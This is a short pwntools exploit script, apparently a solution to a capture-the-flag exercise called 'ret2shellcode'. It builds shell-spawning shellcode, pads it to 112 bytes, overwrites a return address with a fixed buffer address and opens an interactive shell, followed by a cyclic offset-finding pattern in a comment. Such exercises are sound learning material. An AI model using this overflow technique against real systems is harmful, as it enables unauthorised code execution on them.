from pwn import *
io = process("./ret2shellcode")
# context.arch = 'amd64'
context.log_level = 'debug'

shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(112, b'a') + p32(0x804A080)
io.recvuntil(b'No system for you this time !!!\n')
io.send(payload)
io.interactive()
io.close()

# AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA